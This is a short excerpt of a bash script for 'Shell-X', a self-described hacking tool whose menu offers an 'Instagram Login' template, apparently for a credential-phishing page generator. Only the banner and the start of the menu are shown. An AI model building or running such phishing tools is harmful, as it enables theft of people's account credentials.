#!/bin/bash
# Powered by Shell-X
# Credits goes to the Our Team Members: Shivanshu, Vanshagra, Aditya and Priyanshu

trap 'printf "\n";stop' 2

figlet Shell-X
echo "Hacking tool by Aditya,Shivanshu, Vanshagra and Priyanshu"
...
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Instagram Login\e[0m\n"
